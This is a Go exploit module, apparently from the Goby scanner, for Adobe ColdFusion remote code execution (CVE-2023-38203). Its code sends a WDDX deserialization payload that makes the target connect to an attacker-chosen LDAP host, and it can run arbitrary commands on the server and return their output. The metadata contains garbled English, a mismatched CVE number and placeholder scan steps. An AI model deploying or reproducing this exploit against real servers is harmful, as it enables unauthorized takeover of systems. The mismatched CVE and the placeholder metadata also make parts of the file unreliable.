package exploits

import (
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Adobe Coldfusion remote code execution vulnerability (CVE-2023-38203)",
    "Description": "<p>Adobe Coldfusion is a commercial application server developed by Adobe for web applications.</p><p>The attacker can send unbelievable serialized data and trigger derivativeization to the Coldfusion server, thereby executing any code.</p>",
    "Product": "Adobe-ColdFusion",
    "Homepage": "https://www.adobe.com/",
    "DisclosureDate": "2023-07-13",
    "Author": "m0x0is3ry@foxmail.com",
    "FofaQuery": "(body=\"crossdomain.xml\" && body=\"CFIDE\") || (body=\"#000808\" && body=\"#e7e7e7\")",
    "GobyQuery": "(body=\"crossdomain.xml\" && body=\"CFIDE\") || (body=\"#000808\" && body=\"#e7e7e7\")",
    "Level": "3",
    "Impact": "<p>The attacker can execute the code at the server through this vulnerability, obtain the server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The manufacturer has released the vulnerability repair process, please pay attention to the update in time: <a href=\"https://helpx.adobe.com/ColdFusion/kb/coldfusion-2023-update-html\">https://helpx.adobe.com/ColdFusion/kb/coldfusion-2023-update-html</a></p>",
    "References": [
        "https://blog.projectdiscovery.io/adobe-coldfusion-rce/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,ldap",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "ldapAddr",
            "type": "input",
            "value": "",
            "show": "attackType=ldap"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2023-38023"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Adobe ColdFusion 远程代码执行漏洞（CVE-2023-38203）",
            "Product": "Adobe-ColdFusion",
            "Description": "<p>Adobe ColdFusion 是 Adobe 公司开发的用于 Web 应用程序开发的商业应用程序服务器。</p><p>攻击者可向 ColdFusion 服务器发送不受信任的序列化数据并触发反序列化，从而执行任意代码。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://helpx.adobe.com/ColdFusion/kb/coldfusion-2023-update-html\" target=\"_blank\">https://helpx.adobe.com/ColdFusion/kb/coldfusion-2023-update-html</a><br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Adobe Coldfusion remote code execution vulnerability (CVE-2023-38203)",
            "Product": "Adobe-ColdFusion",
            "Description": "<p>Adobe Coldfusion is a commercial application server developed by Adobe for web applications.</p><p>The attacker can send unbelievable serialized data and trigger derivativeization to the Coldfusion server, thereby executing any code.</p>",
            "Recommendation": "<p>The manufacturer has released the vulnerability repair process, please pay attention to the update in time: <a href=\"https://helpx.adobe.com/ColdFusion/kb/coldfusion-2023-update-html\" target=\"_blank\">https://helpx.adobe.com/ColdFusion/kb/coldfusion-2023-update-html</a><br></p>",
            "Impact": "<p>The attacker can execute the code at the server through this vulnerability, obtain the server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-07-20",
    "PocId": "10807"
}`

	sendPayloadFlag81479 := func(hostInfo *httpclient.FixUrl, ldapAddr, cmd string) (*httpclient.HttpResponse, error) {
		payload := `<wddxPacket version='1.0'>
    <header/>
    <data>
        <struct type='xcom.sun.rowset.JdbcRowSetImplx'>
            <var name='dataSourceName'>
                <string>` + ldapAddr + `</string>
            </var>
            <var name='autoCommit'>
                <boolean value='true'/>
            </var>
        </struct>
    </data>
</wddxPacket>`
		cfg := httpclient.NewPostRequestConfig("/CFIDE/adminapi/base.cfc?method")
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		if cmd != "" {
			cfg.Header.Store("cmd", cmd)
		}
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Data = "argumentCollection=" + url.QueryEscape(payload)
		return httpclient.DoHttpRequest(hostInfo, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			ldapToken := goutils.RandomHexString(4)
			ldapURL, _ := godclient.GetGodLDAPCheckURL("U", ldapToken)
			sendPayloadFlag81479(u, ldapURL, "")
			return godclient.PullExists(ldapToken, time.Second*15)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			cmd := ""
			ldapAddr := ""
			if attackType == "cmd" {
				// ldap
				ldapAddr = "ldap://" + godclient.GetGodServerHost() + "/A4"
				cmd = goutils.B2S(ss.Params["cmd"])
			} else if attackType == "ldap" {
				cmd = ""
				ldapAddr = goutils.B2S(ss.Params["ldapAddr"])
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
				return expResult
			}
			rsp, err := sendPayloadFlag81479(expResult.HostInfo, ldapAddr, cmd)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
			} else {
				output := ""
				if attackType == "cmd" {
					if strings.Contains(rsp.Utf8Html, "<!-- \" --->") {
						expResult.Success = true
						output = rsp.Utf8Html[:strings.Index(rsp.Utf8Html, "<!-- \" --->")]
					} else {
						output = "漏洞利用失败"
					}
				} else {
					expResult.Success = true
					output = "请查收 LDAP 请求日志"
				}
				expResult.Output = output
			}
			return expResult
		},
	))
}
